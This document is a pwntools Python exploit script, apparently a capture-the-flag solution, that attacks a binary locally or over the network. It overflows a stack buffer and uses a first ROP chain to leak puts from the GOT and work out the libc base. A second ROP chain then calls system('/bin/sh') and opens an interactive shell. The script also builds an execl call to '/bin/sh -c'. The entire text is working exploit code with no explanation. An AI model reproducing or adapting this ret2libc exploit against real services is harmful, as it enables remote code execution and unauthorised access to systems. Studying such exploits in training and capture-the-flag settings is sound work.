from argparse import ArgumentParser as ap
from pwn import *

parser = ap()
parser.add_argument("binary")
subparsers = parser.add_subparsers(dest='subcommand')

local_parser = subparsers.add_parser('l')
debug_parser = subparsers.add_parser('d')
remote_parser = subparsers.add_parser('r')
remote_parser.add_argument("ip", type=str)
remote_parser.add_argument("port", type=int)
args = parser.parse_args()

if args.subcommand == 'l':
    io = process(f"./{args.binary}")
elif args.subcommand == 'd':
    io = gdb.debug(f"./{args.binary}", gdbscript='continue')
elif args.subcommand == 'r':
    io = remote(args.ip, args.port)
else:
    raise SystemExit



context.arch = 'amd64'
context.binary = elf = ELF(args.binary)

libc = ELF("glibc/libc.so.6")

elf.address = 0x400000

rop = ROP([elf, libc])
PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols['main']
SET_SCORE = elf.symbols['set_score']
PUTS_GOT = elf.got['puts']

# RDI, RSI, RDX, RCX
POP_RDI = rop.rdi
POP_RSI = rop.rsi
POP_RDX = rop.rdx
POP_RCX = rop.rcx
rop.call('execl', [b'/bin/sh', [[b'/bin/sh'], [b'-c'], [b'ls -alrt']], 0])
RET = (rop.find_gadget(['ret']))[0]

while True:
    output = io.recvrepeat(1)
    #print(output.decode())
    if "your name" in output.decode():
        break

    io.sendline(b'r')

OFFSET = b"A" * 24

#Create rop chain
payload1 = OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(SET_SCORE)

time.sleep(1)
io.sendline(payload1)

#Parse leaked address
recvd = io.recv(timeout=2).strip()
print(recvd.splitlines()[2])
leak = u64(recvd.splitlines()[2].ljust(8,b"\x00"))
log.info("Leaked libc address, Puts: %s" % hex(leak))
libc.address = leak - libc.sym["puts"]
log.info("Base address of libc: %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

payload2 = OFFSET + b"B"
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(BINSH)
payload2 += p64(SYSTEM)

rop = ROP([elf, libc])
rop.system(BINSH)

#payload2 += bytes(rop)
r = io.recv(timeout=1)
print(r.decode())
io.sendline(payload2)
io.interactive()


